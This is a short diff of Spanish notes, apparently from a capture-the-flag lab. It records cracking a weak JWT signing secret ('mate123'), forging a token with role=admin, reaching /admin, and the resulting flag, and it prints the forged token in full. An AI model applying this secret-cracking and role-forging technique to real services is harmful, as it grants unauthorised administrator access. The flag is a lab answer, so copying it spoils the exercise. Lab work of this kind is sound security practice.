@@ -1,0 +1,4 @@
+# crackear secreto (R2) -> mate123
+# forjar role=admin -> GET /admin
+token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NTE0MDM5MSwiZXhwIjoxNzk1MTQzOTkxfQ.aiS2sxnLsNrufqSx76q03GWLNkp6HHipXcqH0OuY-Nc
+{"panel": "admin", "auditoria": "FLAG{jwt_forjado_admin}"}
